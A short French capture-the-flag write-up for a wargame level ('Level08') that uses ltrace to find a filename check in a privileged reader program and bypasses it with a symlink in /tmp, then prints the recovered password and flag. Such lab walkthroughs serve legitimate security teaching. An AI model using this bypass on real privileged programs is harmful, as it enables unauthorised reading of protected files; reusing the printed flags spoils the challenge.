# Level08

On observe deux fichiers a la racine: un exécutable <code>level08</code> et un fichier <code>token</code>

<pre><code>$ cat token
cat: token: Permission denied</code></pre>

On fait quelque teste sur l'executable

<pre>$ ./level08
./level08 [file to read]

$ ./level08 token
You may not access 'token'</pre>

On lance ltrace sur l'exécutable et on s'aperçoit que le programme effectue une comparaison avec la fonction strstr qui bloque l'exécution si le nom du fichier fourni contient “token”

<pre>$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 ...
strstr("token", "token")                         = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)     = 27
exit(1 ...
+++ exited (status 1) +++</pre>

On crée donc un lien symbolique vers le fichier token mais possédant un autre nom

<pre>$ ln -s `pwd`/token /tmp/link</pre>

Puis on exécute le programme

<pre>$ ./level08 /tmp/link
quif5eloekouj29ke0vouxean</pre>

<pre>$ su flag08
Password:
Don't forget to launch getflag !

$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f</pre>
